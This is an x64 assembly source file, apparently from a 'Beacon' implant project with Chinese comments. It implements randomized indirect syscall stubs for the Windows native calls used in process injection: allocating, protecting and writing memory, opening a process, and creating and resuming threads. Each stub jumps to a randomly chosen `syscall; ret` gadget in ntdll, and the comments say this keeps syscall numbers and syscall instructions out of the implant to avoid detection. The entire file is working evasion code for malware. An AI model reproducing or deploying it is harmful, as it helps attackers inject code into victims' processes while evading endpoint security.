; stubs_x64.asm -- Randomized direct syscall stubs (x64 only)
;
; 每个 stub 在调用时：
;   1. rdtsc 从 g_syscall_gadget_pool 随机选一个 ntdll 的 `syscall; ret` gadget；
;   2. 从 g_syscall_ssn_table 读取 SSN（SSN 不硬编码进指令流）；
;   3. jmp 到选中的 gadget —— syscall 指令在 ntdll 内执行，且每次调用地址随机。
;
; 表偏移（g_syscall_ssn_table，func_id * 4）必须与 beacon_syscall.h 枚举一致：
;   +0   SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY
;   +4   SYSCALL_NT_PROTECT_VIRTUAL_MEMORY
;   +8   SYSCALL_NT_WRITE_VIRTUAL_MEMORY
;   +16  SYSCALL_NT_OPEN_PROCESS
;   +20  SYSCALL_NT_CREATE_THREAD_EX
;   +28  SYSCALL_NT_RESUME_THREAD
;
; 构建：Beacon.vcxproj 的 MASM 项（仅 x64 平台）。

OPTION DOTNAME

.data
    EXTERN g_syscall_ssn_table:DWORD
    EXTERN g_syscall_gadget_pool:QWORD

.code

; --- BcnNtAllocateVirtualMemory ---
BcnNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 0]
    jmp rcx
BcnNtAllocateVirtualMemory ENDP

; --- BcnNtProtectVirtualMemory ---
BcnNtProtectVirtualMemory PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 4]
    jmp rcx
BcnNtProtectVirtualMemory ENDP

; --- BcnNtCreateThreadEx ---
BcnNtCreateThreadEx PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 20]
    jmp rcx
BcnNtCreateThreadEx ENDP

; --- BcnNtWriteVirtualMemory ---
BcnNtWriteVirtualMemory PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 8]
    jmp rcx
BcnNtWriteVirtualMemory ENDP

; --- BcnNtOpenProcess ---
BcnNtOpenProcess PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 16]
    jmp rcx
BcnNtOpenProcess ENDP

; --- BcnNtResumeThread ---
BcnNtResumeThread PROC
    mov r10, rcx
    mov r11, rdx
    rdtsc
    xor eax, edx
    and eax, 63
    lea rcx, [g_syscall_gadget_pool]
    mov rcx, QWORD PTR [rcx + rax*8]
    mov rdx, r11
    mov eax, DWORD PTR [g_syscall_ssn_table + 28]
    jmp rcx
BcnNtResumeThread ENDP

END
